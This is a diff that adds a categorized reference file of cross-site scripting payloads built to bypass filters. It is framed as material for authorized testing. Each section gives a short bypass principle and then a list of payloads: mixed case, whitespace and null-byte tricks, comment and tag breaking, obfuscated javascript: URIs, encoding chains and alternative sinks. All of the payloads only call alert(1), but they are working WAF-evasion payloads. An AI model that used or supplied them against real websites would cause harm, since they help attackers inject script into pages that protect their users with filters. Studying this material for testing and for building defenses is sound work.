@@ -1,0 +1,105 @@
+# XSS Filter Bypass Payloads
+# Categorized reference for filter evasion during authorized testing
+# Each category header explains the bypass principle
+# All payloads verified against Chrome 120+ or Firefox 120+ unless marked [LEGACY]
+
+# ===== CASE VARIATION =====
+# Principle: WAF rules using case-sensitive string matching are bypassed by mixed case.
+# HTML attributes and tag names are case-insensitive in the HTML parser.
+
+<ScRiPt>alert(1)</sCrIpT>
+<IMG SRC=x OnErRoR=alert(1)>
+<sVg OnLoAd=alert(1)>
+<DETAILS OPEN ONTOGGLE=alert(1)>
+<A HREF=javascript:alert(1)>click</A>
+<INPUT AUTOFOCUS ONFOCUS=alert(1)>
+
+# ===== WHITESPACE INJECTION =====
+# Principle: Extra whitespace, tabs, newlines, and form feeds inside tags or between
+# attribute name and value are ignored by the HTML parser but break WAF regex patterns.
+
+<img src=x	onerror=alert(1)>       # note: tab between attributes
+<img src=x
+onerror=alert(1)>                   # note: newline between attributes
+<img/src=x/onerror=alert(1)>        # note: / as whitespace separator
+<svg	onload=alert(1)>              # note: tab between tag name and attribute
+< script>alert(1)</ script>         # note: space after < — [LEGACY] old parsers only
+<img src=x onerror = alert(1)>      # note: spaces around = sign
+
+# ===== NULL BYTES =====
+# Principle: Some WAFs tokenize on null bytes, splitting a tag across the byte boundary.
+# The browser's HTML parser strips null bytes, reconstructing the original tag.
+# Effectiveness varies by WAF implementation; test in target environment.
+
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<img\x00 src=x onerror=alert(1)>
+<s\x00cript>alert(1)</s\x00cript>
+<img src=\x00javascript:alert(1)>
+
+# ===== COMMENT INJECTION =====
+# Principle: HTML comments inside tag content and attribute values are stripped by the parser
+# but disrupt WAF pattern matching.
+
+<!--<img src=x onerror=alert(1)>-->
+<img src=x <!----> onerror=alert(1)>  # note: comment between attributes [LEGACY] old IE
+<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>  # note: [LEGACY] IE only
+<style>/*</style><img src=x onerror=alert(1)>*/</style>
+
+# ===== TAG BREAKING =====
+# Principle: Injecting characters that break WAF tokenization of tag structure
+# while still being parsed by the browser.
+
+<<script>alert(1)// note: double < — [LEGACY] old IE
+<script >alert(1)</script >   # note: space before >
+<script/x>alert(1)</script>   # note: bogus attribute
+"></script><script>alert(1)</script>  # note: closes prior attribute
+</style></script><script>alert(1)</script>
+'--></style></script><script>alert(1)</script>
+
+# ===== PROTOCOL OBFUSCATION =====
+# Principle: javascript: protocol URIs can be obscured with encoding, whitespace,
+# and case changes while remaining functional in href and src contexts.
+
+<a href=javascript:alert(1)>click</a>
+<a href=JAVASCRIPT:alert(1)>click</a>
+<a href=&#106;avascript:alert(1)>click</a>         # note: entity encode j
+<a href=&#x6A;avascript:alert(1)>click</a>         # note: hex entity encode j
+<a href=j&#97;vascript:alert(1)>click</a>
+<a href="jav	ascript:alert(1)">click</a>          # note: tab inside protocol
+<a href="jav&#x09;ascript:alert(1)">click</a>      # note: encoded tab
+<a href="jav&#x0A;ascript:alert(1)">click</a>      # note: newline inside protocol
+<a href="jav&#x0D;ascript:alert(1)">click</a>      # note: carriage return inside protocol
+
+# ===== ENCODING CHAINS =====
+# Principle: Multi-stage encoding exploits different decoding passes.
+# Server URL-decodes once; browser HTML-decodes in attribute context; JS evaluates strings.
+
+# Double URL encoding — server decodes %25 → %, browser decodes %3C → <
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+
+# HTML entity in JS string context
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+
+# Unicode escape in JS identifier
+<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>
+
+# Base64 via eval (requires eval not being blocked)
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+
+# Double-encoded entities
+&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
+
+# Hex encoded entire payload in JS string
+<script>\x61\x6C\x65\x72\x74\x28\x31\x29</script>
+
+# ===== ALTERNATIVE SINKS =====
+# Principle: When <script> tags and event handlers are blocked, use alternative
+# execution mechanisms that bypass tag-based WAF rules.
+
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+<iframe srcdoc="<img src=x onerror=alert(1)>">
+<object data="javascript:alert(1)">                 # note: blocked in Chrome 81+ by default
+<form action="javascript:alert(1)"><input type=submit>
+<button formaction="javascript:alert(1)">click</button>
+<input type=image src=x onerror=alert(1)>
